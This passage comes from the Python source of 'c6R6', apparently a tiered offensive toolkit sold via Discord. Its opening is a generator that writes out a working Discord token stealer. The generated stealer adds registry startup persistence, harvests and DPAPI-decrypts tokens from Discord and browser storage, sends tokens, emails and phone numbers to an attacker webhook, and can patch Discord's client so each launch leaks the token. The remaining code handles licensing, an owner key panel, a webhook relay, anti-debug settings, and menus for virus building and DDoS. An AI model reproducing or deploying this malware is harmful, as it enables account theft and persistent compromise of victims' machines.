        f'"{sys.executable}" "{__file__}"')
    winreg.CloseKey(k)
except Exception: pass
"""

    inject_code = ""
    if inject:
        inject_code = r"""
import glob as _gl
def _inject_discord():
    lo = os.environ.get("LOCALAPPDATA","")
    for dc in ["Discord","DiscordCanary","DiscordPTB"]:
        dp = os.path.join(lo, dc)
        if not os.path.isdir(dp): continue
        for core in _gl.glob(os.path.join(dp,"app-*","modules","discord_desktop_core-*","discord_desktop_core","index.js")):
            try:
                content = open(core, encoding="utf-8", errors="ignore").read()
                marker  = "//c6r6inject"
                if marker in content: continue
                patch = (
                    f'\n{marker}\n'
                    'require("https").get("https://discord.com/api/v9/users/@me",'
                    '{headers:{"Authorization":require("fs").readFileSync('
                    f'require("os").homedir()+"\\\\dc_tok.txt","utf8").trim()'
                    '}},(r)=>{let d="";r.on("data",(c)=>{d+=c});'
                    f'r.on("end",()=>{{require("https").request({{method:"POST",'
                    f'hostname:"discord.com",path:"/api/webhooks/{{}}/{{}}",'.format(*wh.split("/")[-2:])
                    + 'headers:{"Content-Type":"application/json"}},()=>{}).end(JSON.stringify({content:"tok:"+d.slice(0,500)}));})});'
                    '\n'
                )
                open(core, "a", encoding="utf-8").write(patch)
                print(f"  [INJECTED] {core[:60]}")
            except Exception as e:
                print(f"  [FAIL] {e}")
_inject_discord()
"""

    code = f'''# c6R6 Discord Stealer — VIP+
# pip install requests
import os, re, json, base64, requests, platform, subprocess

WEBHOOK = "{wh}"
{startup_code}
APPDATA = os.environ.get("APPDATA", "")
LOCAL   = os.environ.get("LOCALAPPDATA", "")

PATHS = {{
    "Discord":       os.path.join(APPDATA,  "Discord",      "Local Storage", "leveldb"),
    "DiscordCanary": os.path.join(APPDATA,  "DiscordCanary","Local Storage", "leveldb"),
    "DiscordPTB":    os.path.join(APPDATA,  "DiscordPTB",   "Local Storage", "leveldb"),
    "Chrome":        os.path.join(LOCAL,"Google","Chrome","User Data","Default","Local Storage","leveldb"),
    "Edge":          os.path.join(LOCAL,"Microsoft","Edge","User Data","Default","Local Storage","leveldb"),
    "Brave":         os.path.join(LOCAL,"BraveSoftware","Brave-Browser","User Data","Default","Local Storage","leveldb"),
    "Opera":         os.path.join(APPDATA,"Opera Software","Opera Stable","Local Storage","leveldb"),
}}

TOKEN_RE = re.compile(r"[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,38}}")
ENC_RE   = re.compile(r"dQw4w9WgXcQ:([^\\\"]*)")

def _decrypt_chrome(buf: bytes) -> str:
    """Déchiffre les tokens encryptés V10 (DPAPI / AES-GCM)."""
    try:
        import ctypes
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData",ctypes.c_ulong),("pbData",ctypes.POINTER(ctypes.c_char))]
        b_in  = DATA_BLOB(len(buf), ctypes.cast(ctypes.c_char_p(buf), ctypes.POINTER(ctypes.c_char)))
        b_out = DATA_BLOB()
        ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(b_in),None,None,None,None,0,ctypes.byref(b_out))
        return ctypes.string_at(b_out.pbData, b_out.cbData).decode("utf-8",errors="ignore")
    except Exception: return ""

def gather_tokens():
    found = set()
    for name, path in PATHS.items():
        if not os.path.isdir(path): continue
        for f in os.listdir(path):
            if not f.endswith((".log","ldb")): continue
            try:
                data = open(os.path.join(path,f),"rb").read().decode("utf-8",errors="ignore")
            except Exception: continue
            for t in TOKEN_RE.findall(data): found.add((name, t))
            for enc in ENC_RE.findall(data):
                try:
                    dec = _decrypt_chrome(base64.b64decode(enc + "=="))
                    for t in TOKEN_RE.findall(dec): found.add((name+"[enc]", t))
                except Exception: pass
    return list(found)

def validate(token):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me",
                         headers={{"Authorization": token}}, timeout=6)
        if r.status_code == 200: return r.json()
    except Exception: pass
    return None

def send(tokens_info):
    blocks = []
    for src, tok, user in tokens_info:
        uname  = user.get("username","?") + "#" + str(user.get("discriminator","0")) if user else "invalid"
        nitro  = "💎 " if user and user.get("premium_type") else ""
        email  = user.get("email","?") if user else "?"
        phone  = user.get("phone","?") if user else "?"
        blocks.append(
            f"**Source**: `{{src}}`\\n"
            f"**User**: {{nitro}}`{{uname}}`\\n"
            f"**Email**: `{{email}}`   **Phone**: `{{phone}}`\\n"
            f"**Token**:\\n```{{tok}}```"
        )
    for i in range(0, len(blocks), 5):
        chunk = "\\n\\n".join(blocks[i:i+5])
        try:
            requests.post(WEBHOOK, json={{
                "embeds": [{{
                    "title": f"c6R6 — Tokens ({{i+1}}-{{min(i+5,len(blocks))}})",
                    "description": chunk[:4000],
                    "color": 0xE91E63
                }}]
            }}, timeout=8)
        except Exception: pass

def main():
    raw = gather_tokens()
    results = []
    for src, tok in raw:
        u = validate(tok)
        results.append((src, tok, u))
    valid = [(s,t,u) for s,t,u in results if u]
    print(f"Tokens valides : {{len(valid)}} / {{len(raw)}}")
    if valid: send(valid)
{inject_code}
if __name__ == "__main__":
    main()
'''
    fname = f"dc_stealer_{int(time.time())}.py"
    out(fname, code)
    _hist_log("VIP+","DCStealer",wh[:20]); pause()

# ── FIN VIP+ NEW TOOLS ───────────────────────────────────────────────────

# ========================================================================
# AMI
# ========================================================================
_VAULT_FILE = os.path.join(_AMI_DIR, ".vault")
_RELAY_FILE = os.path.join(_AMI_DIR, ".relay")
_PRESETS_FILE = os.path.join(_AMI_DIR, ".presets")
def ami_menu():
    banner_s("AMI PANEL")
    if not _require_tier("ami"): return
    while True:
        menu_box(f"*** AMI [{_BRAND or 'anonymous'}] ***", [
            ("1","Branding"),("2","Vault"),("3","Relay"),
            ("4","Presets"),("5","Seal Build"),("0", T("back"))], color=AMI_COL)
        c = input(f"  {AMI_COL}AMI>{RST} ").strip()
        if c == "1": ami_brand()
        elif c == "2": ami_vault()
        elif c == "3": ami_relay()
        elif c == "4": ami_presets()
        elif c == "5": _seal_build()
        elif c == "0": break
def ami_brand():
    banner_s("BRANDING"); global _BRAND
    cur = _load_brand()
    if cur: print(f"  {Y}Current{RST}: {G}{cur}{RST}\n")
    new = ask("New handle (empty=clear):")
    os.makedirs(_AMI_DIR, exist_ok=True); open(_BRAND_FILE, "w").write(new)
    _BRAND = new
    print(f"\n{OK} Updated."); _hist_log("AMI","Brand",new); pause()
def _vault_key(pw): return hashlib.sha256(("vault_salt_c6r6_" + pw).encode()).digest()
def _xor(data, key): return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
def ami_vault():
    banner_s("VAULT"); pw = ask("Password:")
    if not pw: pause(); return
    k = _vault_key(pw); os.makedirs(_AMI_DIR, exist_ok=True)
    data = {"notes": [], "creds": []}
    if os.path.isfile(_VAULT_FILE):
        try: data = json.loads(_xor(open(_VAULT_FILE, "rb").read(), k).decode())
        except Exception: pass
    while True:
        print(f"\n  [1]Note [2]Cred [3]List [4]Save+Quit")
        c = ask("Action:", "3")
        if c == "1":
            data["notes"].append({"t": ask("Title:"), "b": ask("Content:"), "at": datetime.now().isoformat()})
            print(f"{OK} added.")
        elif c == "2":
            data["creds"].append({"site": ask("Site:"), "user": ask("User:"), "pass": ask("Pass:")})
            print(f"{OK} added.")
        elif c == "3":
            for n in data["notes"]: print(f"  {Y}{n['t']}{RST} : {DIM}{n['b'][:80]}{RST}")
            for cr in data["creds"]: print(f"  {G}{cr['site']}{RST} | {cr['user']} | {cr['pass']}")
        elif c == "4":
            open(_VAULT_FILE, "wb").write(_xor(json.dumps(data).encode(), k))
            print(f"\n{OK} saved."); _hist_log("AMI","Vault",f"{len(data['notes'])}n/{len(data['creds'])}c"); break
    pause()
def ami_relay():
    banner_s("RELAY"); wh = ask("Owner webhook:", "")
    if not wh:
        try: wh = open(_RELAY_FILE).read().strip()
        except Exception: pass
    if not wh: print(f"{ERR} no webhook."); pause(); return
    os.makedirs(_AMI_DIR, exist_ok=True); open(_RELAY_FILE, "w").write(wh)
    msg = ask("Message:")
    if not msg: pause(); return
    try:
        r = requests.post(wh, json={"embeds": [{"title": f"[RELAY] {_BRAND or 'AMI'}", "color": 0xFF00AA,
            "description": msg, "fields": [{"name": "HWID", "value": _hwid()[:16], "inline": True},
                                           {"name": "Tier", "value": _TIER, "inline": True}],
            "timestamp": datetime.now(timezone.utc).isoformat()}]}, timeout=8)
        print(f"{OK if r.status_code in (200,204) else ERR} {r.status_code}")
        _hist_log("AMI","Relay",msg[:30])
    except Exception as e: print(f"{ERR} {e}")
    pause()
def ami_presets():
    banner_s("PRESETS"); os.makedirs(_AMI_DIR, exist_ok=True)
    presets = {}
    if os.path.isfile(_PRESETS_FILE):
        try: presets = json.load(open(_PRESETS_FILE))
        except Exception: pass
    c = ask("[1]View [2]Add [3]Delete:", "1")
    if c == "1":
        for name, d in presets.items():
            print(f"\n  {G}{name}{RST}")
            for k, v in d.items(): print(f"    {Y}{k}{RST} = {W}{v}{RST}")
    elif c == "2":
        name = ask("Preset name:"); fields = {}
        while True:
            k = ask("Field (empty=done):")
            if not k: break
            fields[k] = ask(f"  {k} =")
        if name and fields:
            presets[name] = fields; json.dump(presets, open(_PRESETS_FILE, "w"), indent=2)
            print(f"{OK} saved."); _hist_log("AMI","Preset+",name)
    elif c == "3":
        for n in presets: print(f"  {Y}-{RST} {n}")
        rm = ask("Name:")
        if rm in presets:
            del presets[rm]; json.dump(presets, open(_PRESETS_FILE, "w"), indent=2)
            print(f"{OK} deleted."); _hist_log("AMI","Preset-",rm)
    pause()

# ========================================================================
# OWNER
# ========================================================================
def owner_menu():
    banner_s("OWNER PANEL")
    if _OWNER_TRIES["n"] >= 3: print(f"  {R}[LOCKED]{RST}"); pause(); return
    if input(f"  {BRIGHT}master >{RST} ").strip() != _OWNER_PW:
        _OWNER_TRIES["n"] += 1; print(f"  {R}[X]{RST} wrong."); time.sleep(1.2); return
    _OWNER_TRIES["n"] = 0
    while True:
        menu_box("OWNER", [
            ("1","Gen Key"),("2","List Keys"),("3","Revoke"),("4","Extend"),
            ("5","Set Tier"),("6","Unbind"),("7","Local Status"),("8","Deactivate"),
            ("9","Server Diag"),("0", T("back"))])
        c = input(f"  {R}owner>{RST} ").strip()
        if c == "1":
            exp = _dur_to_exp(ask("Duration (1d/7d/30d/1y/life):", "30d"))
            if exp is None: print(f"{ERR} {T('invalid')}"); pause(); continue
            tier = ask("Tier:", "vip").lower()
            r = _srv_admin("/admin/gen", {"exp": exp, "tier": tier})
            if r.get("ok"):
                print(f"\n  {G}NEW KEY{RST}: {BRIGHT}{r['key']}{RST}\n  Expires: {_fmt_exp(exp)}  Tier: {tier}")
                _hist_log("OWNER","Gen",f"{tier}:{r['key']}")
            else: print(f"  {R}[X]{RST} {r.get('msg')}")
            pause()
        elif c == "2":
            r = _srv_admin("/admin/list", method="GET")
            if isinstance(r, dict) and r.get("ok") is False: print(f"  {R}[X]{RST} {r.get('msg')}")
            elif not r: print(f"  {DIM}No keys.{RST}")
            else:
                for k, v in r.items():
                    bind = (v["hwid"][:8] + "...") if v.get("hwid") else "free"
                    print(f"  {Y}{k}{RST}  tier={v.get('tier','free')}  exp={_fmt_exp(v.get('exp',0))}  hwid={bind}")
            pause()
        elif c == "3":
            r = _srv_admin("/admin/revoke", {"key": ask("Key:")})
            print(f"  {G}[OK]{RST}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
            _hist_log("OWNER","Revoke","ok"); pause()
        elif c == "4":
            k = ask("Key:"); exp = _dur_to_exp(ask("New duration:", "30d"))
            if exp is None: print(f"{ERR} {T('invalid')}"); pause(); continue
            r = _srv_admin("/admin/extend", {"key": k, "exp": exp})
            print(f"  {G}[OK]{RST} → {_fmt_exp(exp)}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
            _hist_log("OWNER","Extend",k[:20]); pause()
        elif c == "5":
            k = ask("Key:"); tier = ask("New tier:", "vip").lower()
            r = _srv_admin("/admin/tier", {"key": k, "tier": tier})
            print(f"  {G}[OK]{RST} → {tier}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
            _hist_log("OWNER","Tier",f"{k[:20]}:{tier}"); pause()
        elif c == "6":
            r = _srv_admin("/admin/unbind", {"key": ask("Key:")})
            print(f"  {G}[OK]{RST} unbind." if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
            _hist_log("OWNER","Unbind","ok"); pause()
        elif c == "7":
            ok, msg = _is_activated()
            if ok:
                lic = _load_lic()
                print(f"  {G}[ACTIVE]{RST} key: {lic['key']}")
                print(f"  Tier: {lic.get('tier','free')}  Exp: {_fmt_exp(lic.get('exp',0))}")
                print(f"  HWID: {lic['hwid'][:16]}...")
            else: print(f"  {R}[INACTIVE]{RST} {msg}")
            pause()
        elif c == "8":
            if ask("Confirm? (y/n):", "n").lower() in ("y","o"):
                try: os.remove(_LIC_FILE); print(f"  {G}[OK]{RST} removed.")
                except Exception as e: print(f"  {R}[FAIL]{RST} {e}")
            pause()
        elif c == "9": _srv_diagnostic()
        elif c == "0": break

# ========================================================================
# SETTINGS
# ========================================================================
def settings_menu():
    while True:
        banner_s("SETTINGS")
        opts = [
            ("1","Auto-activation",_get("auto_activate")),
            ("2","Preset key",(_get("preset_key") or "(empty)")),
            ("3","Remember license",_get("remember_license")),
            ("4","Clear cache on boot",_get("clear_cache_on_boot")),
            ("5","Loader animation",_get("loader_on")),
            ("6","Tier badge",_get("show_tier_badge")),
            ("7","Verbose server",_get("verbose_server")),
            ("8","Status bar",_get("status_bar")),
            ("9","Clipboard",_get("clipboard")),
            ("10","Anti-debug",_get("anti_debug")),
            ("11","Auto-update",_get("auto_update")),
            ("12","Theme",_CURRENT_THEME),
            ("13","Language",_LANG.upper()),
            ("14","Tamper check",_get("tamper_check")),
        ]
        for n, lbl, val in opts:
            v = f"{G}ON{RST}" if val is True else f"{R}OFF{RST}" if val is False \
                else f"{Y}{str(val)[:24]}{RST}"
            print(f"    {PALE}[{n}]{RST} {W}{lbl:<22}{RST} {v}")
        for n, l in [("15","History"),("16","Favorites"),("17","Export config"),
                     ("18","Import config"),("19","Reset"),("20","Server Diagnostic"),
                     ("21","Server URL")]:
            print(f"    {PALE}[{n}]{RST} {W}{l}{RST}")
        print(f"    {PALE}[0]{RST}  {W}{T('back')}{RST}\n")
        c = input(f"  {R}settings>{RST} ").strip()
        if c == "0": break
        if c == "20": _srv_diagnostic(); continue
        if c == "21":
            cur = _get("server_url") or _LIC_SERVER_DEFAULT
            print(f"  {DIM}Current: {cur}{RST}")
            new = ask("New server URL (empty=default):", "").strip()
            _SETTINGS["server_url"] = new
            _save_settings()
            print(f"{OK} saved → {new or _LIC_SERVER_DEFAULT}")
            print(f"  {DIM}Retesting...{RST}")
            _ping_srv(force=True)
            ms, st, d = _ping_srv(force=True)
            col = G if st == "online" else Y if st in ("tunnel","auth") else R
            print(f"  {col}{st}{RST}  {DIM}{d}{RST}")
            pause()
            continue
        if c.isdigit() and 1 <= int(c) <= 14:
            i = int(c)
            if i == 2:
                print(f"  {DIM}Current: {_get('preset_key') or '(empty)'}{RST}")
                _SETTINGS["preset_key"] = ask("New preset key (empty=clear):")
            elif i == 12:
                t = ask("Theme (blood/matrix/cyberpunk/mono):", _CURRENT_THEME).lower()
                if t in _THEMES: _SETTINGS["theme"] = t; _apply_theme(t); print(f"{OK} {t}")
                time.sleep(0.5)
            elif i == 13:
                l = ask("Language (en/fr):", _LANG).lower()
                if _set_lang(l): _SETTINGS["language"] = l; print(f"{OK} {l.upper()}")
                time.sleep(0.5)
            else:
                key_map = {1:"auto_activate",3:"remember_license",4:"clear_cache_on_boot",
                           5:"loader_on",6:"show_tier_badge",7:"verbose_server",
                           8:"status_bar",9:"clipboard",10:"anti_debug",
                           11:"auto_update",14:"tamper_check"}
                if i in key_map:
                    _SETTINGS[key_map[i]] = not _get(key_map[i])
                    if key_map[i] == "loader_on":
                        globals()["LOADER_ON"] = bool(_SETTINGS[key_map[i]])
            _save_settings()
        elif c == "15": history_screen()
        elif c == "16": favorites_screen()
        elif c == "17":
            banner_s("EXPORT")
            bundle = {"version": VERSION, "settings": dict(_SETTINGS), "history": _hist_load(200),
                      "favorites": _fav_load(), "exported_at": datetime.now().isoformat()}
            p = f"1-Output/c6r6_config_{int(time.time())}.json"
            os.makedirs("1-Output", exist_ok=True); json.dump(bundle, open(p, "w"), indent=2)
            print(f"\n{OK} → {Y}{p}{RST}"); _hist_log("CONFIG","Export",p); pause()
        elif c == "18":
            banner_s("IMPORT"); p = ask("File:")
            if not os.path.isfile(p): print(f"{ERR} {T('not_found')}"); pause(); continue
            try: bundle = json.load(open(p, encoding="utf-8"))
            except Exception as e: print(f"{ERR} {e}"); pause(); continue
            _SETTINGS.update(bundle.get("settings", {})); _save_settings()
            print(f"{OK} imported."); _hist_log("CONFIG","Import",p); pause()
        elif c == "19":
            if ask("Confirm? (y/n):", "n").lower() in ("y","o"):
                _SETTINGS.clear(); _SETTINGS.update(_DEFAULT); _save_settings()
                _apply_theme(_DEFAULT["theme"]); globals()["_LANG"] = _DEFAULT["language"]
                globals()["LOADER_ON"] = _DEFAULT["loader_on"]
                print(f"{OK} reset."); time.sleep(0.6)

# ========================================================================
# INFO
# ========================================================================
def info_screen():
    banner_s("INFO & CONTACT")
    ms, state, detail = _ping_srv()
    sc = G if state == "online" else Y if state == "tunnel" else R
    print(f"""
  {MID}──[ {BRT}{BRIGHT}c6R6 v{VERSION}{RST}{MID} ]──{RST}

  {Y}Tier{RST}     : {W}{_TIER}{RST}
  {Y}Brand{RST}    : {W}{_BRAND or '-'}{RST}
  {Y}HWID{RST}     : {G}{_hwid()}{RST}
  {Y}Server{RST}   : {sc}{state}{RST}  {DIM}{detail}{RST}
  {Y}Theme{RST}    : {W}{_CURRENT_THEME}{RST}
  {Y}Language{RST} : {W}{_LANG.upper()}{RST}

  {MID}──[ JOIN ]──{RST}
  {G}Discord{RST}  : {BRT}{BRIGHT}{DISCORD_LINK}{RST}

  {MID}──[ PRICING ]──{RST}
  {Y}VIP{RST}     : {W}full VIP panel{RST}
  {PLUS_COL}VIP+{RST}    : {W}VIP + 19 exclusive tools{RST}
  {AMI_COL}AMI{RST}     : {W}all + branding + vault + relay{RST}
  {ACCENT}Owner{RST}   : {W}all + key management{RST}

  {DIM}Owner trigger: 1337 at main menu{RST}
  {DIM}Server diag: Settings > 20{RST}
""")
    _hist_log("INFO","View","info"); pause()

# ========================================================================
# MAIN MENU
# ========================================================================
def _box_group(title, color, items, col_w=26):
    title_t = _trunc(title, col_w - 4)
    fill = max(0, col_w - _vlen(title_t) - 4)
    lines = [f"{color}┌─ {BRT}{color}{title_t}{RST}{color} " + "─" * fill + f"┐{RST}"]
    for k, label in items:
        label_t = _trunc(label, col_w - 7)
        item = f"{color}[{k}]{RST} {W}{label_t}{RST}"
        vis = 4 + 1 + _vlen(label_t)
        lines.append(f"{color}│{RST} {item}" + " " * max(0, col_w - vis - 1) + f"{color}│{RST}")
    while len(lines) < 10: lines.append(f"{color}│{RST}" + " " * col_w + f"{color}│{RST}")
    lines.append(f"{color}└" + "─" * col_w + f"┘{RST}")
    return lines

def main_menu_draw():
    leakfr_banner(); W_ = _term_w()
    cats = [
        (T("cat_build"), CAT_BUILD, [("01",T("o_virus")),("02",T("o_hwid")),
                                     ("03",T("o_disc")),("04",T("o_vc"))]),
        (T("cat_scan"), CAT_SCAN, [("10",T("o_net")),("11",T("o_web")),("12",T("o_osint"))]),
        (T("cat_panel"), CAT_PANEL, [("20",T("o_vip")),("21",T("o_rbx")),
                                     ("22",T("o_crypto")),("23",T("o_phone")),
                                     ("24",T("o_utils")),("25",T("o_vipx")),
                                     ("26",T("o_ami")),("27",T("o_plugins"))]),
        (T("cat_net"), CAT_NET, [("30",T("o_ddos")),("40",T("o_info")),
                                 ("50",T("o_set")),("60",T("o_compile"))]),
    ]
    boxes = [_box_group(t, c, items) for t, c, items in cats]
    max_h = max(len(b) for b in boxes)
    for b in boxes:
        while len(b) < max_h: b.append(" " * 28)
    total_w = 4 * 28 + 3 * 2
    left = max(0, (W_ - total_w) // 2)
    print()
    for i in range(max_h):
        print(" " * left + "  ".join(_pad(b[i], 28) for b in boxes))
    tc = {"free": DIM, "vip": BRIGHT, "vip+": PLUS_COL, "ami": AMI_COL, "owner": ACCENT}.get(_TIER, DIM)
    hint = f"tier: {_TIER}  ·  {T('hint')}"
    print(f"\n{' ' * max(0, (W_ - _vlen(hint)) // 2)}{MID}»{RST} {tc}tier: {_TIER}{RST}  {GHOST}·  {T('hint')}{RST}")
    print(f"{' ' * max(0, (W_ - len(DISCORD_LINK) - 4) // 2)}{DARK}──[ {RST}{BRT}{BRIGHT}{DISCORD_LINK}{RST}{DARK} ]──{RST}")
    _draw_status()

# ========================================================================
# MAIN
# ========================================================================
def main():
    _apply_pending_update()
    _verify_integrity()
    _anti_debug_check()
    _load_settings()

    if _get("clear_cache_on_boot") and os.path.isfile(_LIC_FILE):
        try: os.remove(_LIC_FILE)
        except Exception: pass

    if _get("auto_activate") and not os.path.isfile(_LIC_FILE) and _get("preset_key"):
        print(f"  {DIM}Auto-activation...{RST}"); _page_loader("Activation")
        _activate(_get("preset_key"))

    ok, msg = _is_activated()
    if not ok:
        activation_screen()
        ok, msg = _is_activated()
        if not ok: print(f"  {R}[X]{RST} {msg}"); sys.exit(1)

    _first_run_compile_prompt()
    play_intro()
    _loader_steps(f"c6R6 v{VERSION}", ["loading network","loading discord",
                                       "loading hwid",f"license ({_TIER})"])
    _check_update()
    plugins = _load_plugins()
    if plugins: print(f"  {G}[+]{RST} {len(plugins)} plugin(s): {', '.join(plugins)}")

    while True:
        main_menu_draw()
        W_ = _term_w()
        c = input(" " * max(0, (W_ - 40) // 2) + f"{BRIGHT}c6r6 >{RST} ").strip().lower()
        if c == _OWNER_TRIG: owner_menu(); continue
        if c in ("0","exit","quit"):
            clr(); print(f"\n  {LIGHT}c6R6{RST} {GHOST}· by 31300 · à bientôt.{RST}\n"); sys.exit(0)
        elif c == "f": favorites_screen()
        elif c == "h": history_screen()
        elif c == "p": plugins_menu()
        elif c in ("01","1"): builder_menu()
        elif c in ("02","2"): hwid_menu()
        elif c in ("03","3"): discord_menu()
        elif c in ("04","4"): vc_menu()
        elif c == "10": net_menu()
        elif c == "11": web_menu()
        elif c == "12": osint_menu()
        elif c == "20": vip_menu()
        elif c == "21": roblox_menu()
        elif c == "22": crypto_menu()
        elif c == "23": phone_menu()
        elif c == "24": util_menu()
        elif c == "25": vipx_menu()
        elif c == "26": ami_menu()
        elif c == "27": plugins_menu()
        elif c == "30": ddos_menu()
        elif c == "40": info_screen()
        elif c == "50": settings_menu()
        elif c == "60": _compile_to_exe()
        else:
            print(f"  {MID}[c6r6]{RST} unknown."); time.sleep(0.5)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        sys.stdout.write(RST + "\n")
        print(f"\n  {LIGHT}c6R6{RST} {GHOST}· interrupted{RST}\n"); sys.exit(0)
